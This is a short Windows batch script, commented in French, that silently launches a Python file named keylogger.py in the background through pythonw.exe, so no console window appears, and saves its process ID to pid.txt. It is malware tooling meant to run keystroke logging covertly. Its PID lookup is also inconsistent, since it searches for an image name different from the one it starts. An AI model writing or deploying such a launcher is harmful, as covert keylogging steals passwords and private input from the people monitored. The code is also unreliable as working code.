@echo off
:: Lancer le script Python et capturer le PID
if exist keylogger.py (
    start /B pythonw.exe keylogger.py
    :: Attendre un peu pour que le processus démarre
    timeout /t 1 /nobreak >nul
    :: Capturer le PID du dernier processus pythonw.exe
    for /f "tokens=2" %%i in ('tasklist /FI "IMAGENAME eq pythonw3.12.exe" /NH') do (
        echo %%i > pid.txt
        goto :break
    )
    :break
    exit /b 0
) else (
    echo Keylogger script not found in the current directory.
    exit /b 1
)
